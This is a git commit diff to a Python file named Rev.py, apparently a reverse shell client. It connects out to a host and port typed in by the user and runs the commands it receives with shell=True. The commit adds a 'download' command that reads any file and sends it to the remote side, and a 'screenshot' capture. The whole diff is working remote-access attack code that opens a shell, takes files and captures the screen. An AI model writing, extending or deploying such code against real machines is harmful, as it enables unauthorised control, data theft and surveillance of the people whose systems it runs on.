9ceeb0a6083e243873dc2c5542df8fd14c81bf86
cl3tu5 <53231555+CletusG@users.noreply.github.com>
2020-09-20 18:28:43 -0400

    Added download and screenshot functional support

--- Linux/Rev.py
+++ Linux/Rev.py
@@ -1,14 +1,16 @@
 import os
 import socket
 import subprocess
-import tqdm
+import pyscreenshot as cam
 
 s = socket.socket()
 host = input(("Host: "))
 port = int(input("Port: "))
 s.connect((host, port))
 
-BYTES = 10000
+BYTES = 10000000
+
+n = 1
 
 while True:
 		data = s.recv(BYTES)
@@ -22,16 +24,27 @@ while True:
 				s.send(e.encode() + "\n".encode())
 				continue
 		elif data.decode("utf-8") == "download":
-			file_path = s.recv(BYTES)
-			file_path = file_path.decode()
-			file = open(file_path, "rb")
-			contents = file.read()
-			s.send(contents)
-			print("File sent succesfully")
-
+			try:
+				file_path = s.recv(BYTES)
+				file_path = file_path.decode()
+				file = open(file_path, "rb")
+				contents = file.read()
+				while contents:
+					s.send(contents)
+					contents = file.read(BYTES)
+				file.close()
+				print("File sent succesfully")
+				s.send('complete'.encode())
+			except FileNotFoundError:
+				s.send("[i] File not found".encode())
+		elif data.decode("utf-8") == "screenshot":
+			img = cam.grab()
+			name = 'shot' + str(n) + '.png'
+			img.save(name)
+			n = n + 1
+		
+		## For cd to work, this has to be enabled as a seperate statement instead of an else or a elif
 		if len(data) > 0:
-			# process open
-			# play around with shell
 			cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			output_bytes = cmd.stdout.read() + cmd.stderr.read()
 			output_str = str(output_bytes, "utf-8")
